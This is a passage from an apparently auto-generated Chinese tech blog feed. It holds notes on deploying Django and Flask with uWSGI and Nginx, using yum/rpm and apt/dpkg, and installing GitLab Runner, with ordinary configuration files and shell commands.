class="language-bash">在app加载前切换到该目录，设置为Django项目根目录</span></span><br><span class="line">chdir = /srv/addcoder</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加载指定的python WSGI模块，设置为Django项目的wsgi文件</span></span><br><span class="line">module = addcoder.wsgi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动一个master进程来管理其他进程</span></span><br><span class="line">master = true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工作的进程数</span></span><br><span class="line">processes = 2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每个进程下的线程数量</span></span><br><span class="line">threads = 4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当服务器退出的时候自动删除unix socket文件和pid文件</span></span><br><span class="line">vacuum = true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使进程在后台运行，并将日志打到指定的日志文件或者udp服务器</span></span><br><span class="line">daemonize = /srv/addcoder/uwsgi.log</span><br></pre></td></tr></table></figure><ul><li>加载配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uwsgi --ini uwsgi_addcoder.ini</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">出现getting INI configuration from uwsgi.ini（成功）</span></span><br></pre></td></tr></table></figure><ul><li><p>项目有更新的时候，需要先关闭uwsgi然后重启即可</p></li><li><p>基本命令</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动uwsgi服务器</span></span><br><span class="line">uwsgi --ini uwsgi_addcoder.ini</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看uwsgi是否运行</span></span><br><span class="line">ps -aux | grep uwsgi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看端口号占用</span></span><br><span class="line">netstat -anp | grep 11001</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结束uwsgi进程</span></span><br><span class="line">pgrep uwsgi | xargs kill -s 9</span><br></pre></td></tr></table></figure><h3 id="六、配置Nginx"><a href="#六、配置Nginx" class="headerlink" title="六、配置Nginx"></a>六、配置Nginx</h3><p>配置nginx，若启动失败，测试配置文件是否正确</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nginx -t</span><br></pre></td></tr></table></figure><ul><li>nginx配置文件分开配置</li></ul><p>nginx.conf文件尽量不做修改，只需在最末尾加载配置文件，然后在conf.d文件中放入不同的conf文件进行编辑配置。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">include /etc/nginx/conf.d/*.conf</span><br></pre></td></tr></table></figure><ul><li>编辑配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/addcoder.conf</span><br></pre></td></tr></table></figure><ul><li>示例</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网站配置</span></span><br><span class="line">server &#123;</span><br><span class="line">    # 设置监听端口</span><br><span class="line">    listen 80;</span><br><span class="line">    # 设置对外访问入口,可以是域名可以是公网IP</span><br><span class="line">    server_name blog.xxx.com;</span><br><span class="line">    # 设置虚拟主机的基本信息</span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass 127.0.0.1:11001;</span><br><span class="line">        uwsgi_read_timeout 60;</span><br><span class="line">    &#125;</span><br><span class="line">    # 静态文件设置</span><br><span class="line">    location /static &#123;</span><br><span class="line">        expires 30d;</span><br><span class="line">        alias /srv/addcoder/static/;</span><br><span class="line">    &#125;</span><br><span class="line">    # 创建Let’s Encrypt免费SSL证书临时文件</span><br><span class="line">    location /.well-known/acme-challenge &#123;</span><br><span class="line">        alias /srv/addcoder/.well-known/acme-challenge;</span><br><span class="line">    &#125;</span><br><span class="line">    # 允许网段</span><br><span class="line">    allow all;</span><br><span class="line">    # 设置访问的语言编码</span><br><span class="line">    charset UTF-8;</span><br><span class="line">    # nginx的超时参数设置为60秒</span><br><span class="line">    send_timeout 60;</span><br><span class="line">    # 实IP在X-Forwarded-For请求头中</span><br><span class="line">    real_ip_header X-Real-IP;</span><br><span class="line">    # X-Forwarded-For请求头中的最后一个IP当成真实IP</span><br><span class="line">    real_ip_recursive off;</span><br><span class="line">    # 设置fastcgi缓冲区为8块128k大小的空间</span><br><span class="line">    fastcgi_buffers 8 128k;</span><br><span class="line">    # 上传文件大小限制,默认1m</span><br><span class="line">    client_max_body_size 0;</span><br><span class="line">    # 访问日志记录</span><br><span class="line">    access_log /var/log/nginx/addcoder_access.log;</span><br><span class="line">    # 错误日志记录</span><br><span class="line">    error_log /var/log/nginx/addcoder_error.log;</span><br><span class="line">    # 开启gzip</span><br><span class="line">    gzip on;</span><br><span class="line">    # 是否在http header中添加Vary:Accept-Encoding</span><br><span class="line">    gzip_vary on;</span><br><span class="line">    # 设置压缩所需要的缓冲区大小</span><br><span class="line">    gzip_buffers 32 4K;</span><br><span class="line">    # gzip 压缩级别,1-9,数字越大压缩的越好,也越占用CPU时间</span><br><span class="line">    gzip_comp_level 5;</span><br><span class="line">    # 启用gzip压缩的最小文件,小于设置值的文件将不会压缩</span><br><span class="line">    gzip_min_length 100;</span><br><span class="line">    # 配置禁用gzip条件,支持正则</span><br><span class="line">    gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line">    # 进行压缩的文件类型</span><br><span class="line">    gzip_types application/javascript text/css text/xml;</span><br><span class="line">    # HTTP严格传输安全的max-age需要大于15768000秒</span><br><span class="line">    add_header Strict-Transport-Security &quot;max-age=31536000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="七、启动服务器"><a href="#七、启动服务器" class="headerlink" title="七、启动服务器"></a>七、启动服务器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到项目目录下运行</span></span><br><span class="line">uwsgi --ini uwsgi_addcoder.ini</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启nginx服务</span></span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No93：Flask部署Linux+uWSGI+Nginx</title>
      <link href="/posts/8e55db4d.html"/>
      <url>/posts/8e55db4d.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、系统配置"><a href="#一、系统配置" class="headerlink" title="一、系统配置"></a>一、系统配置</h3><ul><li>转为root用户以获取权限</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><ul><li>修改主机名</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname xxx</span><br></pre></td></tr></table></figure><h3 id="二、所需软件安装"><a href="#二、所需软件安装" class="headerlink" title="二、所需软件安装"></a>二、所需软件安装</h3><ol><li><p>Python3.6及以上</p></li><li><p>MySQL5.6及以上</p></li><li><p>Nginx</p></li><li><p>Git</p></li></ol><h3 id="三、安装-创建虚拟环境"><a href="#三、安装-创建虚拟环境" class="headerlink" title="三、安装&amp;创建虚拟环境"></a>三、安装&amp;创建虚拟环境</h3><h3 id="四、项目代码注意事项"><a href="#四、项目代码注意事项" class="headerlink" title="四、项目代码注意事项"></a>四、项目代码注意事项</h3><ul><li>公网访问配置</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开生产环境</span></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br></pre></td></tr></table></figure><ul><li>迁移数据库</li></ul><h3 id="五、安装与配置uwsgi"><a href="#五、安装与配置uwsgi" class="headerlink" title="五、安装与配置uwsgi"></a>五、安装与配置uwsgi</h3><p>nginx是门户,它负责转发,它转发动态请求给uwsgi,然后uwsgi在转给django处理。</p><ul><li>安装uwsgi</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install uwsgi</span><br></pre></td></tr></table></figure><ul><li>测试是否安装完成并且正常</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uwsgi --version</span><br></pre></td></tr></table></figure><ul><li>配置uwsgi.ini文件</li></ul><p>在项目文件夹与manage.py同级的目录下创建uwsgi.ini，文件内容如下（注意路径）：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">uwsgi监听的socket，一会儿配置Nginx会用到</span></span><br><span class="line">socket = 127.0.0.1:5050</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在app加载前切换到该目录，设置为Flask项目根目录</span></span><br><span class="line">chdir = /srv/goodsmovie</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加载指定的python WSGI模块，设置为Flask项目的manage文件</span></span><br><span class="line">wsgi-file = ./manage.py</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定app对象实例</span></span><br><span class="line">callable = app</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动一个master进程来管理其他进程</span></span><br><span class="line">master = true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工作的进程数</span></span><br><span class="line">processes = 2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每个进程下的线程数量</span></span><br><span class="line">threads = 4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当服务器退出的时候自动删除unix socket文件和pid文件</span></span><br><span class="line">vacuum = true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使进程在后台运行，并将日志打到指定的日志文件或者udp服务器</span></span><br><span class="line">daemonize = /srv/goodsmovie/uwsgi.log</span><br></pre></td></tr></table></figure><ul><li>加载配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uwsgi --ini uwsgi_goodsmovie.ini</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">出现getting INI configuration from uwsgi.ini（成功）</span></span><br></pre></td></tr></table></figure><ul><li><p>项目有更新的时候，需要先关闭uwsgi然后重启即可</p></li><li><p>基本命令</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动uwsgi服务器</span></span><br><span class="line">uwsgi --ini uwsgi_goodsmovie.ini</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看uwsgi是否运行</span></span><br><span class="line">ps -aux | grep uwsgi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看端口号占用</span></span><br><span class="line">netstat -anp | grep 5050</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结束uwsgi进程</span></span><br><span class="line">pgrep uwsgi | xargs kill -s 9</span><br></pre></td></tr></table></figure><h3 id="六、配置Nginx"><a href="#六、配置Nginx" class="headerlink" title="六、配置Nginx"></a>六、配置Nginx</h3><p>配置nginx，若启动失败，测试配置文件是否正确</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nginx -t</span><br></pre></td></tr></table></figure><ul><li>nginx配置文件分开配置</li></ul><p>nginx.conf文件尽量不做修改，只需在最末尾加载配置文件，然后在conf.d文件中放入不同的conf文件进行编辑配置。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">include /etc/nginx/conf.d/*.conf</span><br></pre></td></tr></table></figure><ul><li>编辑配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/goodsmovie.conf</span><br></pre></td></tr></table></figure><ul><li>示例</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网站配置</span></span><br><span class="line">server &#123;</span><br><span class="line">    # 设置监听端口</span><br><span class="line">    listen 80;</span><br><span class="line">    # 设置对外访问入口,可以是域名可以是公网IP</span><br><span class="line">    server_name movie.xxx.com;</span><br><span class="line">    # 设置虚拟主机的基本信息</span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass 127.0.0.1:5050;</span><br><span class="line">        uwsgi_read_timeout 60;</span><br><span class="line">    &#125;</span><br><span class="line">    # 静态文件设置</span><br><span class="line">    location /static &#123;</span><br><span class="line">        expires 30d;</span><br><span class="line">        alias /srv/goodsmovie/static/;</span><br><span class="line">    &#125;</span><br><span class="line">    # 创建Let’s Encrypt免费SSL证书临时文件</span><br><span class="line">    location /.well-known/acme-challenge &#123;</span><br><span class="line">        alias /srv/goodsmovie/.well-known/acme-challenge;</span><br><span class="line">    &#125;</span><br><span class="line">    # 允许网段</span><br><span class="line">    allow all;</span><br><span class="line">    # 设置访问的语言编码</span><br><span class="line">    charset UTF-8;</span><br><span class="line">    # nginx的超时参数设置为60秒</span><br><span class="line">    send_timeout 60;</span><br><span class="line">    # 实IP在X-Forwarded-For请求头中</span><br><span class="line">    real_ip_header X-Real-IP;</span><br><span class="line">    # X-Forwarded-For请求头中的最后一个IP当成真实IP</span><br><span class="line">    real_ip_recursive off;</span><br><span class="line">    # 设置fastcgi缓冲区为8块128k大小的空间</span><br><span class="line">    fastcgi_buffers 8 128k;</span><br><span class="line">    # 上传文件大小限制,默认1m</span><br><span class="line">    client_max_body_size 0;</span><br><span class="line">    # 访问日志记录</span><br><span class="line">    access_log /var/log/nginx/goodsmovie_access.log;</span><br><span class="line">    # 错误日志记录</span><br><span class="line">    error_log /var/log/nginx/goodsmovie_error.log;</span><br><span class="line">    # 开启gzip</span><br><span class="line">    gzip on;</span><br><span class="line">    # 是否在http header中添加Vary:Accept-Encoding</span><br><span class="line">    gzip_vary on;</span><br><span class="line">    # 设置压缩所需要的缓冲区大小</span><br><span class="line">    gzip_buffers 32 4K;</span><br><span class="line">    # gzip 压缩级别,1-9,数字越大压缩的越好,也越占用CPU时间</span><br><span class="line">    gzip_comp_level 5;</span><br><span class="line">    # 启用gzip压缩的最小文件,小于设置值的文件将不会压缩</span><br><span class="line">    gzip_min_length 100;</span><br><span class="line">    # 配置禁用gzip条件,支持正则</span><br><span class="line">    gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line">    # 进行压缩的文件类型</span><br><span class="line">    gzip_types application/javascript text/css text/xml;</span><br><span class="line">    # HTTP严格传输安全的max-age需要大于15768000秒</span><br><span class="line">    add_header Strict-Transport-Security &quot;max-age=31536000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="七、启动服务器"><a href="#七、启动服务器" class="headerlink" title="七、启动服务器"></a>七、启动服务器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到项目目录下运行</span></span><br><span class="line">uwsgi --ini uwsgi_goodsmovie.ini</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启nginx服务</span></span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No92：Centos7的yum、rpm使用</title>
      <link href="/posts/d7742bc7.html"/>
      <url>/posts/d7742bc7.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、yum安装、卸载软件"><a href="#1、yum安装、卸载软件" class="headerlink" title="1、yum安装、卸载软件"></a>1、yum安装、卸载软件</h3><ul><li>yum简介</li></ul><p>yum（全称为Yellow dog Updater，Modified）是一个在Fedora和RedHat以及CentOS中的Shell前端软件包管理器。</p><p>基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。</p><ul><li>更换yum镜像源</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份源文件</span></span><br><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载新的CentOS-Base.repo(阿里云)到/etc/yum.repos.d/</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure><ul><li>常用的yum命令</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示已经安装的软件包</span></span><br><span class="line">yum list installed</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找可以安装的软件包（以tomcat为例）</span></span><br><span class="line">yum list tomcat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装软件包（以tomcat为例）</span></span><br><span class="line">yum install tomcat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">升级某一个软件包（以tomcat为例）</span></span><br><span class="line">yum update tomcat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载软件包（以tomcat为例）</span></span><br><span class="line">yum remove tomcat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出软件包的依赖（以tomcat为例）</span></span><br><span class="line">yum deplist tomcat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-y自动应答<span class="built_in">yes</span></span></span><br><span class="line">yum -y install tomcat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">info显示软件包的描述信息和概要信息（以tomcat为例）</span></span><br><span class="line">yum info tomcat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查可更新的程序</span></span><br><span class="line">yum check-update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成缓存</span></span><br><span class="line">yum makecache</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">升级所有的软件包</span></span><br><span class="line">yum -y update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">升级所有的软件包，禁掉GPG验证检查</span></span><br><span class="line">yum -y update --nogpgcheck</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清理缓存</span></span><br><span class="line">yum clean all</span><br></pre></td></tr></table></figure><ul><li>yum可视化图形界面Yumex</li></ul><p>yum Extender(简称yumex)，是yum的图形化操作界面。可以通过yumex方便的查看软件包，安装、卸载软件包。对于对命令行不熟的人简直就是神器，管理软件包很方便。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install yumex</span><br></pre></td></tr></table></figure><h3 id="2、Rpm彻底完全删除已安装软件"><a href="#2、Rpm彻底完全删除已安装软件" class="headerlink" title="2、Rpm彻底完全删除已安装软件"></a>2、Rpm彻底完全删除已安装软件</h3><ul><li>查询是否安装了软件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep -i 软件名</span><br><span class="line">rpm -qa | grep 软件名</span><br></pre></td></tr></table></figure><ul><li>删除已安装的软件包</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">普通删除模式，根据第一步显示的软件包名，一个个删除</span></span><br><span class="line">sudo rpm -e  -- 包名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">强力删除模式，如果用上面命令删除时，提示有依赖的其他文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">则用该命令可以对其进行强力删除</span></span><br><span class="line">sudo rpm -e --nodeps 包名</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No91：Ubuntu16的apt、dpkg使用</title>
      <link href="/posts/a06d062.html"/>
      <url>/posts/a06d062.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、apt的使用"><a href="#1、apt的使用" class="headerlink" title="1、apt的使用"></a>1、apt的使用</h3><p>apt会解决和安装模块的依赖问题,并会咨询软件仓库，但不会安装本地的deb文件，apt是建立在dpkg之上的软件管理工具。</p><ul><li>安装软件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在线安装软件包</span></span><br><span class="line">apt-get install 软件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新安装软件包</span></span><br><span class="line">apt-get install 软件名 --reinstall</span><br></pre></td></tr></table></figure><ul><li>卸载软件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除软件包</span></span><br><span class="line">sudo apt-get remove 软件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除软件包及配置文件</span></span><br><span class="line">sudo apt-get remove --purge 软件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除不再需要的软件包</span></span><br><span class="line">sudo apt-get autoremove</span><br></pre></td></tr></table></figure><ul><li>更新系统</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除索引</span></span><br><span class="line">sudo apt-get clean</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新源</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新软件</span></span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据依赖关系更新</span></span><br><span class="line">sudo apt-get dist-upgrade</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修复损坏的软件包，尝试卸载出错的包，重新安装正确版本的</span></span><br><span class="line">sudo apt-get -f install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除不再需要的软件包</span></span><br><span class="line">sudo apt-get autoremove</span><br></pre></td></tr></table></figure><ul><li>添加启动器和桌面快捷方式</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入快捷方式目录</span></span><br><span class="line">/usr/share/applications</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加一个启动器配置文件，以vscode为例，创建vscode.desktop文件</span></span><br><span class="line"></span><br><span class="line">sudo vim vscode.desktop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加如下内容（需要做适当修改</span></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Version=1.0</span><br><span class="line">Name=$&#123;程序名称&#125;</span><br><span class="line">Exec=$&#123;可执行文件路径&#125;</span><br><span class="line">Terminal=false</span><br><span class="line">Icon=$&#123;表示该可执行文件的图标&#125;</span><br><span class="line">Type=Application</span><br><span class="line">Categories=Development</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在Dock最上面的Search里面找到vscode程序，然后拖放到桌面上的Dock即可点击运行</span></span><br></pre></td></tr></table></figure><h3 id="2、dpkg的使用"><a href="#2、dpkg的使用" class="headerlink" title="2、dpkg的使用"></a>2、dpkg的使用</h3><p>dpkg是用来安装.deb文件,但不会解决模块的依赖关系,且不会关心ubuntu的软件仓库内的软件,可以用于安装本地的deb文件。</p><ul><li>安装软件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装软件，安装本地软件包，不解决依赖关系</span></span><br><span class="line">sudo dpkg -i deb文件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据经验，通常情况下会报依赖关系的错误，我们可以使用以下的命令修复安装</span></span><br><span class="line">sudo apt-get install -f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看已经安装的软件，并找到自己的安装的软件名</span></span><br><span class="line">sudo dpkg -l</span><br></pre></td></tr></table></figure><ul><li>卸载软件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除软件包</span></span><br><span class="line">sudo dpkg -r 软件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除软件包及配置文件</span></span><br><span class="line">sudo dpkg -P</span><br></pre></td></tr></table></figure><ul><li>处理软件包出错</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将info文件夹更名</span></span><br><span class="line">sudo mv /var/lib/dpkg/info /var/lib/dpkg/info_old</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再新建一个新的info文件夹</span></span><br><span class="line">sudo mkdir /var/lib/dpkg/info</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -f install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行完上一步操作后会在新的info文件夹下生成一些文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">现将这些文件全部移到info_old文件夹下</span></span><br><span class="line">sudo mv /var/lib/dpkg/info/* /var/lib/dpkg/info_old</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把自己新建的info文件夹删掉</span></span><br><span class="line">sudo rm -rf /var/lib/dpkg/info</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把以前的info文件夹重新改回名字</span></span><br><span class="line">sudo mv /var/lib/dpkg/info_old /var/lib/dpkg/info</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No90：GitLab的Runner的安装方法</title>
      <link href="/posts/4b7eb4f0.html"/>
      <url>/posts/4b7eb4f0.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载可执行文件</span></span><br><span class="line">curl -L --output /usr/local/bin/gitlab-runner https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-linux-amd64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加可执行权限</span></span><br><span class="line">chmod 777 /usr/local/bin/gitlab-runner</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加软链</span></span><br><span class="line">ln -snf /usr/local/bin/gitlab-runner /usr/bin/gitlab-runner</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成工作目录</span></span><br><span class="line">mkdir /srv/runner</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用root权限运行，避免权限问题</span></span><br><span class="line">gitlab-runner install --user=root --working-directory=/srv/runner</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装相关工具</span></span><br><span class="line">yum install -y tcl-devel</span><br><span class="line">yum install -y expect</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">gitlab-runner start</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注册runner</span></span><br><span class="line">gitlab-runner register --url https://gitlab.com/ --registration-token 注册令牌</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、卸载"><a href="#2、卸载" class="headerlink" title="2、卸载"></a>2、卸载</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">gitlab-runner stop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">取消开机启动</span></span><br><span class="line">chkconfig gitlab-runner off</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span 